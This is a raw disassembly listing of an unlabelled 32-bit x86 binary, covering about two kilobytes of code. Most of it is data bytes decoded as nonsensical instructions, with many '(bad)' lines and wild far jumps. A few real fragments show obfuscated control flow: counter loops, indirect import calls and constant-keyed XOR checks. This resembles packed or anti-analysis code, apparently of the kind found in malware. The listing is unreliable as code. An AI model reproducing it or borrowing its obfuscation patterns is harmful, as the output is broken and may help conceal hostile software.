  4083d1:	imul   ebx,ebx,0x3efa8f80
  4083d7:	int3   
  4083d8:	mov    ds:0x23683dec,eax
  4083dd:	ja     0x40844d
  4083df:	icebp  
  4083e0:	add    eax,edi
  4083e2:	test   eax,0x6876a45e
  4083e7:	int    0x8b
  4083e9:	test   BYTE PTR [edi-0x72],0xd7
  4083ed:	addr16 jb 0x40842c
  4083f0:	xchg   ecx,eax
  4083f1:	outs   dx,DWORD PTR ds:[esi]
  4083f2:	and    bl,al
  4083f4:	nop
  4083f5:	out    dx,eax
  4083f6:	icebp  
  4083f7:	or     dh,BYTE PTR [ecx]
  4083f9:	mov    ebp,0x2e162e39
  4083fe:	mov    WORD PTR [esi],es
  408400:	dec    esi
  408401:	add    BYTE PTR [eax],bh
  408403:	cmp    DWORD PTR [edx+0x4e5be447],edi
  408409:	mov    cl,0x97
  40840b:	stos   BYTE PTR es:[edi],al
  40840c:	mov    BYTE PTR [edx-0x22],al
  40840f:	neg    DWORD PTR [eax+edi*8]
  408412:	imul   edi,DWORD PTR ds:0xb7c935c5,0x36b4db11
  40841c:	gs jo  0x408435
  40841f:	lea    ebp,[eax]
  408421:	and    ebx,DWORD PTR [eax*2-0x1a069590]
  408428:	fwait
  408429:	sub    esi,edx
  40842b:	(bad)  
  40842c:	iret   
  40842d:	jecxz  0x40840b
  40842f:	jg     0x40841c
  408431:	std    
  408432:	xchg   esp,eax
  408433:	and    al,0xf7
  408435:	aam    0xc0
  408437:	jmp    0x9768:0xd4235e8f
  40843e:	fadd   DWORD PTR [edi+esi*1+0x64651729]
  408445:	xchg   edi,eax
  408446:	retf   
  408447:	inc    edx
  408448:	lods   al,BYTE PTR ds:[esi]
  408449:	push   esp
  40844a:	cwde   
  40844b:	cmp    cl,BYTE PTR [ebx+0xa02cda6]
  408451:	inc    esp
  408452:	mov    DWORD PTR [eax+0x547cf1a0],edx
  408458:	mov    al,ds:0x698b236b
  40845d:	push   0x30
  40845f:	aad    0x23
  408461:	pushf  
  408462:	push   cs
  408463:	push   ss
  408464:	inc    ecx
  408465:	inc    esp
  408466:	and    dl,BYTE PTR [ecx+0x52]
  408469:	cmp    al,0x80
  40846b:	fist   WORD PTR [ebx+ebp*8+0x52286d94]
  408472:	or     ch,BYTE PTR [ebx]
  408474:	(bad)  
  408475:	std    
  408476:	data16 jecxz 0x40847e
  408479:	lahf   
  40847a:	cmp    eax,0xa99a793
  40847f:	adc    BYTE PTR ds:0x1408be3b,ch
  408485:	addr16 ds jge 0x408433
  408489:	mov    al,ds:0x80ebdca7
  40848e:	loopne 0x408505
  408490:	inc    eax
  408491:	push   cs
  408492:	ja     0x408507
  408494:	call   0xbef8:0xd56974ff
  40849b:	inc    ebx
  40849c:	lods   eax,DWORD PTR ds:[esi]
  40849d:	stos   BYTE PTR es:[edi],al
  40849e:	adc    ah,BYTE PTR [edi+0x31a0fa3f]
  4084a4:	xchg   BYTE PTR ds:0xebff5e25,cl
  4084aa:	ret    0x1db4
  4084ad:	(bad)  
  4084ae:	xchg   ebp,eax
  4084af:	fidiv  WORD PTR [ebx+0x2f]
  4084b2:	xchg   esp,eax
  4084b3:	dec    esp
  4084b4:	or     ebx,DWORD PTR [edi-0x5a6274d8]
  4084ba:	jg     0x4084cf
  4084bc:	loop   0x40849b
  4084be:	inc    ebp
  4084bf:	and    eax,0x71ecd6cb
  4084c4:	push   edi
  4084c5:	sub    cl,BYTE PTR [ebx]
  4084c7:	and    eax,0xfdab2cf1
  4084cc:	scas   eax,DWORD PTR es:[edi]
  4084cd:	cld    
  4084ce:	fcmove st,st(1)
  4084d0:	push   si
  4084d2:	hlt    
  4084d3:	cs call 0x2ac4:0x75a4223
  4084db:	rcr    DWORD PTR ds:0x1bb0786,cl
  4084e1:	loopne 0x40855e
  4084e3:	cmp    edx,DWORD PTR [edi-0x47940b7e]
  4084e9:	repz repz cli 
  4084ec:	sub    bh,BYTE PTR [ecx-0x2a]
  4084ef:	and    esp,eax
  4084f1:	xchg   ecx,eax
  4084f2:	js     0x408503
  4084f4:	test   BYTE PTR [esi+0x9],cl
  4084f7:	add    BYTE PTR [eax],al
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	mov    bh,0x22
  4085df:	and    ch,cl
  4085e1:	in     al,dx
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	fild   QWORD PTR [esi-0x384e0fe2]
  4085ef:	push   ss
  4085f0:	sub    edi,DWORD PTR [ebp-0xc]
  4085f3:	lahf   
  4085f4:	mov    WORD PTR [esi],cs
  4085f6:	shr    BYTE PTR [eax-0x4dabe93b],0x9
  4085fd:	(bad)  
  4085fe:	stc    
  4085ff:	xchg   ebx,eax
  408600:	iret   
  408601:	and    BYTE PTR [ebx+0x365d5674],0x38
  408608:	add    al,0x32
  40860a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40860b:	ss ret 
  40860d:	mov    al,0xcd
  40860f:	leave  
  408610:	push   0x13c70d23
  408615:	iret   
  408616:	dec    esi
  408617:	and    edx,DWORD PTR [edx-0x50b05a03]
  40861d:	xor    BYTE PTR [ecx-0x6278f6f1],cl
  408623:	and    cl,bl
  408625:	xor    al,0xb9
  408627:	clc    
  408628:	lods   eax,DWORD PTR ds:[esi]
  408629:	mov    DWORD PTR [ebx],0xfb1d2f80
  40862f:	sub    BYTE PTR [edi],ah
  408631:	jns    0x40866e
  408633:	inc    edi
  408634:	mov    al,ds:0x18e28db
  408639:	push   0x81381ce
  40863e:	mov    esp,0xba68b76f
  408643:	cdq    
  408644:	and    edi,DWORD PTR [ecx]
  408646:	data16 repnz adc al,0x9
  40864a:	aaa    
  40864b:	xchg   esp,eax
  40864c:	data16 xor dl,al
  40864f:	inc    esi
  408650:	add    bh,BYTE PTR [eax+0x42]
  408653:	fdiv   QWORD PTR [esi+0x378c1bb2]
  408659:	adc    dl,BYTE PTR [eax+0x35ccc429]
  40865f:	jae    0x4085ec
  408661:	add    al,0xa4
  408663:	shl    ecx,0xb4
  408666:	mov    ah,0xdd
  408668:	or     BYTE PTR [ebx+0x8],al
  40866b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40866c:	mov    ecx,0xa51e819a
  408671:	loope  0x40862e
  408673:	ret    
  408674:	jae    0x40863e
  408676:	mov    ds:0xfb0cc8de,eax
  40867b:	xlat   BYTE PTR ds:[ebx]
  40867c:	lds    esp,FWORD PTR ds:0x510715f0
  408682:	sub    esi,DWORD PTR [esi]
  408684:	sub    al,0xc7
  408686:	mov    eax,0xde5ccec9
  40868b:	push   edx
  40868c:	jle    0x4086f2
  40868e:	add    eax,0xe261d1cc
  408693:	ins    WORD PTR es:[edi],dx
  408695:	(bad)  
  408696:	sub    DWORD PTR [bx+si+0x33],esi
  40869a:	sbb    BYTE PTR [ebx],ah
  40869c:	(bad)  
  40869d:	in     al,dx
  40869e:	stos   DWORD PTR es:[edi],eax
  40869f:	(bad)  
  4086a0:	jl     0x4086f5
  4086a2:	loope  0x40865f
  4086a4:	mov    ecx,0xe4b88f4c
  4086a9:	or     dl,dl
  4086ab:	fistp  WORD PTR [esi]
  4086ad:	inc    ecx
  4086ae:	mov    ch,0x32
  4086b0:	shl    BYTE PTR [eax-0x42099881],1
  4086b6:	inc    ebx
  4086b7:	jno    0x408645
  4086b9:	pop    ecx
  4086ba:	(bad)  
  4086bb:	adc    al,0x79
  4086bd:	or     al,dh
  4086bf:	xlat   BYTE PTR ds:[ebx]
  4086c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086c2:	xor    al,0xf0
  4086c4:	mov    al,0xb5
  4086c6:	es pusha 
  4086c8:	shl    DWORD PTR [ebx+0x7c23c2f8],1
  4086ce:	les    ebx,FWORD PTR [edx-0x101c65c0]
  4086d4:	(bad)  
  4086d5:	lds    edi,FWORD PTR [ebp-0x6a]
  4086d8:	aad    0x65
  4086da:	adc    ebx,DWORD PTR [edi]
  4086dc:	jb     0x4086be
  4086de:	jo     0x40872c
  4086e0:	sbb    edx,DWORD PTR [edx]
  4086e2:	in     al,dx
  4086e3:	fisub  WORD PTR ds:0x5c83f852
  4086e9:	ret    0x6b0f
  4086ec:	mov    bh,0xee
  4086ee:	pop    es
  4086ef:	add    dl,BYTE PTR [esi-0x76]
  4086f2:	mov    cl,0xba
  4086f4:	mov    ecx,0x21edc368
  4086f9:	mov    edx,0x4408bff1
  4086fe:	jne    0x4086ac
  408700:	xor    DWORD PTR [edx-0x7cc2daeb],0x4001c97b
  40870a:	(bad)
  40870d:	adc    DWORD PTR [ecx-0x48],edi
  408710:	fyl2x  
  408712:	fs dec edi
  408714:	fwait
  408715:	lods   al,BYTE PTR ds:[esi]
  408716:	pop    edi
  408717:	lock lock pop edi
  40871a:	push   ss
  40871b:	sar    BYTE PTR [edx+0x52b15a0a],cl
  408721:	shr    BYTE PTR [edi],0xd7
  408724:	cmp    al,0x51
  408726:	mov    ebx,0xbc6cfe41
  40872b:	jmp    0x44f4:0x63c57086
  408732:	jae    0x4086f9
  408734:	push   esp
  408735:	dec    esi
  408736:	loopne 0x4086c5
  408738:	jb     0x40879f
  40873a:	and    al,0xf1
  40873c:	or     esi,DWORD PTR [ebp+0x36]
  40873f:	cwde   
  408740:	je     0x4087b4
  408742:	push   0xffffffc6
  408744:	adc    bl,bl
  408746:	icebp  
  408747:	stc    
  408748:	push   esp
  408749:	test   eax,0xc94901ab
  40874e:	ins    DWORD PTR es:[edi],dx
  40874f:	pop    ss
  408750:	push   cs
  408751:	inc    edx
  408752:	xchg   esp,eax
  408753:	mov    eax,DWORD PTR [ebp-0x8]
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [esi+0x5201b533],cl
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	stc    
  408778:	and    edi,DWORD PTR [ebx-0x3d6ba3b9]
  40877e:	sub    al,0x8
  408780:	xor    BYTE PTR [edi+0x1],al
  408783:	push   esi
  408784:	call   0x860f:0x5e5e594
  40878b:	push   0xcce5ea5
  408790:	jno    0x408743
  408792:	aad    0x29
  408794:	inc    esp
  408795:	add    eax,0xb28784c2
  40879a:	pop    eax
  40879b:	pop    esi
  40879c:	xor    bh,BYTE PTR [ebx]
  40879e:	push   ebp
  40879f:	and    edx,DWORD PTR [edi]
  4087a1:	imul   DWORD PTR [ecx+ebx*4]
  4087a4:	cmovne edi,DWORD PTR [ebp+edi*1-0x36559dac]
  4087ac:	repnz pop es
  4087ae:	push   es
  4087af:	sub    al,0x9c
  4087b1:	call   0x690dfe17
  4087b6:	es inc eax
  4087b8:	outs   dx,BYTE PTR ds:[esi]
  4087b9:	aam    0xef
  4087bb:	fst    DWORD PTR [edx+0x256f2401]
  4087c1:	dec    eax
  4087c2:	jp     0x408749
  4087c4:	popf   
  4087c5:	je     0x4087cf
  4087c7:	inc    edx
  4087c8:	add    DWORD PTR [eax+0x78a5dca4],esp
  4087ce:	test   DWORD PTR es:[edi+0x7c82777],edx
  4087d5:	sbb    ecx,DWORD PTR [esi+0x39967fca]
  4087db:	gs jle 0x4087a2
  4087de:	mov    dl,0x37
  4087e0:	add    ah,BYTE PTR [ecx+ecx*8]
  4087e3:	mov    ch,BYTE PTR [ecx+esi*1-0x64da3e79]
  4087ea:	and    dh,BYTE PTR [ecx]
  4087ec:	call   0x1b8dff42
  4087f1:	adc    al,0x1c
  4087f3:	repz mov ah,0x2b
  4087f6:	mov    dl,0xa2
  4087f8:	adc    eax,0xf5892083
  4087fd:	pop    eax
  4087fe:	fnstcw WORD PTR [esi]
  408800:	mov    bl,0xad
  408802:	mov    bh,0x2d
  408804:	call   0x7011:0x5987f88c
  40880b:	cmp    DWORD PTR [edi+0x5c],edx
  40880e:	push   ebx
  40880f:	rcr    BYTE PTR [edx-0x6],1
  408812:	xchg   esi,eax
  408813:	in     eax,dx
  408814:	jb     0x408804
  408816:	jae    0x4087b2
  408818:	adc    dh,BYTE PTR [eax+0x32ca93db]
  40881e:	out    dx,eax
  40881f:	fld    st(7)
  408821:	ret    0x3d7e
  408824:	sub    BYTE PTR [edx-0x5fbc94c2],0x46
  40882b:	iret   
  40882c:	cli    
  40882d:	out    dx,al
  40882e:	mov    edi,ebx
  408830:	dec    ebx
  408831:	test   eax,0x21208156
  408836:	mov    al,BYTE PTR [ecx]
  408838:	mov    esi,0xa4edfb30
  40883d:	add    BYTE PTR [ebx-0x6d04993b],0xbc
  408844:	jns    0x4087fa
  408846:	shl    BYTE PTR [ebx-0x29c9ea73],cl
  40884c:	shr    ch,cl
  40884e:	sub    eax,0xde07bc84
  408853:	mov    ebx,0x55defb7f
  408858:	cs add eax,0xdb403920
  40885e:	into   
  40885f:	arpl   cx,bx
  408861:	enter  0x97a,0x6b
  408865:	das    
  408866:	in     eax,dx
  408867:	mov    dl,0x8e
  408869:	cmp    BYTE PTR [esi-0xc],cl
  40886c:	xor    DWORD PTR [ecx+eax*8+0x29a3bf1f],ecx
  408873:	push   0xfd6779fe
  408878:	add    eax,0x7ca340da
  40887d:	xchg   DWORD PTR [edx+esi*1-0x5fa9ee47],esi
  408884:	mov    al,ds:0x3d469c5a
  408889:	inc    eax
  40888a:	fwait
  40888b:	call   0x6ee9:0xe562a02a
  408892:	cmp    eax,0x1bf3f807
  408897:	xchg   ebp,eax
  408898:	(bad)
  40889b:	imul   eax,DWORD PTR [edi+0x5a],0x779e9704
  4088a2:	cs jmp 0x4088a6
  4088a5:	out    0x19,al
  4088a7:	(bad)  
  4088a8:	cs add eax,0x86d96763
  4088ae:	daa    
  4088af:	jb     0x4088a6
  4088b1:	xor    eax,0xd3a3b6dd
  4088b6:	dec    ebp
  4088b7:	fistp  QWORD PTR [ecx+0x40]
  4088ba:	sbb    al,0x10
  4088bc:	inc    DWORD PTR [ecx+0x1d4f1022]
  4088c2:	gs jl  0x408938
  4088c5:	jg     0x40885e
  4088c7:	addr16 in eax,dx
  4088c9:	and    BYTE PTR ds:0xe719bba9,ch
  4088cf:	stos   BYTE PTR es:[edi],al
  4088d0:	retf   
  4088d1:	dec    esp
  4088d2:	out    dx,al
  4088d3:	jmp    0x34dfc687
  4088d8:	fistp  WORD PTR [ebx]
  4088da:	xor    ebp,DWORD PTR [ebp+0x35]
  4088dd:	fucomip st,st(7)
  4088df:	inc    ecx
  4088e0:	mov    ebx,DWORD PTR [edi+0x5e]
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xe29e681a
  40893f:	(bad)  
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	and    esi,DWORD PTR [edx-0x2b]
  40894c:	das    
  40894d:	pop    edx
  40894e:	mov    al,ds:0x41f035c2
  408953:	(bad)  
  408954:	xor    cl,BYTE PTR ds:0x6af791ee
  40895a:	fs pop ebx
  40895c:	cmp    eax,0x79c28afe
  408961:	mov    eax,ds:0xe0511cf
  408966:	or     bh,BYTE PTR [edx+eax*2+0x3057add0]
  40896d:	addr16 jmp 0x408908
  408970:	cmp    eax,0xa4eb3dd0
  408975:	dec    edx
  408976:	mov    WORD PTR [eax+0x6ded6c17],?
  40897c:	pop    esp
  40897d:	dec    edi
  40897e:	fnsave [esi]
  408980:	adc    dh,BYTE PTR [edi-0x47afb4f9]
  408986:	adc    dh,BYTE PTR [ebp-0x6ff7d9fa]
  40898c:	out    0x3c,al
  40898e:	pusha  
  40898f:	fcomp  st(5)
  408991:	mov    dh,BYTE PTR [edi]
  408993:	sub    esp,DWORD PTR [edi-0x75]
  408996:	gs stos DWORD PTR es:[edi],eax
  408998:	add    DWORD PTR [ebx+0x3c98c6d2],ebx
  40899e:	sbb    BYTE PTR [edx-0xbae9d],ah
  4089a4:	mov    al,0xe4
  4089a6:	mov    BYTE PTR [ebx+eax*2],bl
  4089a9:	in     al,dx
  4089aa:	ja     0x40899a
  4089ac:	mov    ecx,0x78674011
  4089b1:	imul   edi,DWORD PTR [ecx],0xfffffff9
  4089b4:	push   ebx
  4089b5:	leave  
  4089b6:	arpl   WORD PTR [esi+0x1e],sp
  4089b9:	ss out 0x99,eax
  4089bc:	mov    cl,0x2c
  4089be:	add    ebx,DWORD PTR [edx-0x54c10317]
  4089c4:	test   al,0xd6
  4089c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c7:	mov    ds:0x83152759,eax
  4089cc:	lods   eax,DWORD PTR ds:[esi]
  4089cd:	mov    esp,esi
  4089cf:	push   0x60
  4089d1:	shr    BYTE PTR [esp+edi*8-0x46e01b5a],1
  4089d8:	mov    bh,0xff
  4089da:	outs   dx,BYTE PTR ds:[esi]
  4089db:	mov    edx,0xe3e3375b
  4089e0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4089e2:	cmp    ebx,edx
  4089e4:	jo     0x4089e6
  4089e6:	xlat   BYTE PTR ds:[ebx]
  4089e7:	test   al,0xac
  4089e9:	push   es
  4089ea:	in     al,0x8b
  4089ec:	cs add al,0x42
  4089ef:	xchg   edx,eax
  4089f0:	inc    ecx
  4089f1:	sbb    esp,ebp
  4089f3:	dec    BYTE PTR [ebx+eax*8]
  4089f6:	cmp    al,0x2
  4089f8:	sub    DWORD PTR [eax],esi
  4089fa:	xchg   edi,eax
  4089fb:	iret   
  4089fc:	push   es
  4089fd:	clc    
  4089fe:	jle    0x4089c1
  408a00:	imul   bl
  408a02:	xchg   ecx,eax
  408a03:	outs   dx,BYTE PTR ds:[esi]
  408a04:	adc    al,al
  408a06:	xchg   ebx,eax
  408a07:	mov    ch,0x48
  408a09:	jge    0x408a65
  408a0b:	jle    0x408a77
  408a0d:	mov    ds:0x48994cf5,al
  408a12:	shl    BYTE PTR [edx+ecx*2-0x6a],0x7c
  408a17:	or     al,0x17
  408a19:	xor    BYTE PTR [edx],dh
  408a1b:	cs inc edx
  408a1d:	outs   dx,DWORD PTR ds:[esi]
  408a1e:	sub    eax,0xd6668fd1
  408a23:	repnz stos BYTE PTR es:[edi],al
  408a25:	fisub  WORD PTR [ebx]
  408a27:	popf   
  408a28:	lods   eax,DWORD PTR ds:[esi]
  408a29:	mov    al,0x4
  408a2b:	xchg   edx,eax
  408a2c:	jbe    0x408a15
  408a2e:	cs ds mov edi,0xbca22599
  408a35:	add    al,0x71
  408a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a38:	jb     0x408ab8
  408a3a:	jle    0x4089bf
  408a3c:	clc    
  408a3d:	mov    DWORD PTR [esi-0x2e],ecx
  408a40:	scas   al,BYTE PTR es:[edi]
  408a41:	iret   
  408a42:	scas   eax,DWORD PTR es:[edi]
  408a43:	mov    dl,0x95
  408a45:	shr    DWORD PTR [eax+0x11],0x47
  408a49:	mov    ecx,0x30148079
  408a4e:	scas   eax,DWORD PTR es:[edi]
  408a4f:	jg     0x408a71
  408a51:	test   bl,al
  408a53:	es (bad) 
  408a55:	xor    ebp,esi
  408a57:	arpl   WORD PTR [edx-0x123db108],dx
  408a5d:	mov    al,0x15
  408a5f:	adc    BYTE PTR [edx-0x4639f90f],dl
  408a65:	dec    esi
  408a66:	or     cl,BYTE PTR [edx+ecx*1-0x40a2ebf9]
  408a6d:	and    al,0x6a
  408a6f:	fwait
  408a70:	daa    
  408a71:	xchg   ebp,eax
  408a72:	adc    eax,0x92f95230
  408a77:	push   ds
  408a78:	popa   
  408a79:	adc    ebp,DWORD PTR [ecx+eax*8+0x4a]
  408a7d:	cmp    DWORD PTR [ebx],esi
  408a7f:	das    
  408a80:	sub    edx,esi
  408a82:	or     BYTE PTR [ebx-0x506af1df],dl
  408a88:	es jns 0x408a83
  408a8b:	add    ebp,DWORD PTR es:[esi-0x7f]
  408a8f:	mov    ebp,0x3c8d217
  408a94:	hlt    
  408a95:	inc    eax
  408a96:	(bad)  
  408a98:	mov    ds:0x479a8ba0,eax
  408a9d:	adc    dh,BYTE PTR [ebp-0x19886a34]
  408aa3:	adc    esp,ebp
  408aa5:	fucom  st(1)
  408aa7:	es adc al,ah
  408aaa:	jmp    0xb2d8:0xf2d7f2fc
  408ab1:	mov    edi,DWORD PTR [esi-0x75]
  408ab4:	jge    0x408abe
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	in     al,dx
  408b1b:	xlat   BYTE PTR ds:[ebx]
  408b1c:	fcomp  DWORD PTR [ecx]
  408b1e:	scas   al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	mov    esp,DWORD PTR ds:0x2866156
  408b2c:	xor    eax,0xd43086e5
  408b31:	pop    ds
  408b32:	(bad)  
  408b33:	pop    eax
  408b34:	jl     0x408b7f
  408b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b37:	dec    edi
  408b38:	aad    0x20
  408b3a:	popa   
  408b3b:	jge    0x408bb3
  408b3d:	rcr    BYTE PTR [ebx],0x30
  408b40:	pop    es
  408b41:	adc    eax,0x959b6af6
  408b46:	jge    0x408bbd
  408b48:	bnd jmp 0xac61c3b6
  408b4e:	fsub   st(5),st
  408b50:	dec    esi
  408b51:	lds    ebp,FWORD PTR ss:[eax]
  408b54:	pusha  
  408b55:	leave  
  408b56:	lds    ebp,FWORD PTR [edx-0x3b]
  408b59:	add    eax,0xd8449e12
  408b5e:	xor    edi,DWORD PTR [ebp+0x3022b464]
  408b64:	cmp    BYTE PTR [edi+0x60d07029],ch
  408b6a:	dec    ebx
  408b6b:	push   ecx
  408b6c:	call   0x40db:0xa678c57b
  408b73:	cmp    DWORD PTR [edx],edx
  408b75:	data16 mov BYTE PTR [esi],bh
  408b78:	iret   
  408b79:	jne    0x408b12
  408b7b:	dec    edx
  408b7c:	adc    dh,al
  408b7e:	mov    dh,0x23
  408b80:	repz mov WORD PTR [eax-0x45],gs
  408b84:	daa    
  408b85:	push   0xa712534a
  408b8a:	xchg   BYTE PTR [esi-0x70],dh
  408b8d:	jno    0x408b1b
  408b8f:	ins    DWORD PTR es:[edi],dx
  408b90:	pop    esp
  408b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b92:	sbb    BYTE PTR [ecx-0x2ee6df71],0xf0
  408b99:	cmp    BYTE PTR [ebx-0x3c51b430],al
  408b9f:	dec    edx
  408ba0:	pop    ss
  408ba1:	test   DWORD PTR [ecx],esp
  408ba3:	shl    ebx,1
  408ba5:	dec    ebp
  408ba6:	adc    bh,al
  408ba8:	inc    ebp
  408ba9:	sub    eax,0xf4347d6c
  408bae:	push   ebx
  408baf:	mov    ds:0x71474605,eax
  408bb4:	pusha  
  408bb5:	ins    BYTE PTR es:[edi],dx
  408bb6:	xchg   ecx,eax
  408bb7:	jno    0x408b54
  408bb9:	lods   al,BYTE PTR ds:[esi]
  408bba:	jne    0x408bf7
  408bbc:	xchg   ecx,eax
  408bbd:	lods   eax,DWORD PTR ds:[esi]
  408bbe:	lods   al,BYTE PTR ds:[esi]
  408bbf:	cwde   
  408bc0:	dec    ebx
  408bc1:	jb     0x408be3
  408bc3:	mov    ebp,DWORD PTR [eax+0x634e4dc0]
  408bc9:	mov    dl,0xdc
  408bcb:	jbe    0x408b8d
  408bcd:	pop    eax
  408bce:	out    0x50,al
  408bd0:	mov    ah,0x2c
  408bd2:	jmp    0x74d14760
  408bd7:	es mov ah,0xd
  408bda:	popf   
  408bdb:	and    BYTE PTR [edx-0x3d1fcdfa],0xe5
  408be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408be3:	mov    ebp,0x999aa5e6
  408be8:	addr16 rcr bl,0xe3
  408bec:	cmc    
  408bed:	add    al,0x31
  408bef:	jne    0x408c1d
  408bf1:	add    BYTE PTR [ecx+0x40],dl
  408bf4:	lahf   
  408bf5:	dec    eax
  408bf6:	cld    
  408bf7:	fdivr  DWORD PTR [ecx-0x3e]
  408bfa:	aaa    
  408bfb:	sub    dh,BYTE PTR [edi+ebx*4]
  408bfe:	push   ss
  408bff:	pop    ebx
  408c00:	mov    eax,ebp
  408c02:	cmp    ebx,esp
  408c04:	inc    eax
  408c05:	out    0xe6,eax
  408c07:	cmp    dl,bh
  408c09:	cmp    DWORD PTR [esi],edi
  408c0b:	(bad)  
  408c0c:	mov    esp,0x125f3247
  408c11:	and    ah,BYTE PTR [edi]
  408c13:	shl    BYTE PTR ds:0x220a586b,0xba
  408c1a:	and    BYTE PTR [ecx+edx*8-0x667e5495],ah
  408c21:	add    ah,BYTE PTR [esp+ebp*4+0x14]
  408c25:	xchg   esp,eax
  408c26:	enter  0x5611,0x58
  408c2a:	(bad)  
  408c2b:	out    0x28,eax
  408c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c2e:	dec    edx
  408c2f:	or     ecx,edx
  408c31:	xor    BYTE PTR [esi+0x389bd353],al
  408c37:	xor    esi,DWORD PTR [ebx-0x5a]
  408c3a:	mov    eax,ds:0x751637e3
  408c3f:	mov    ch,0xa9
  408c41:	mov    gs,WORD PTR [ecx+0x32]
  408c44:	fldpi  
  408c46:	push   ecx
  408c47:	cmc    
  408c48:	xlat   BYTE PTR ds:[ebx]
  408c49:	iret   
  408c4a:	lock sub eax,0x8347131d
  408c50:	aaa    
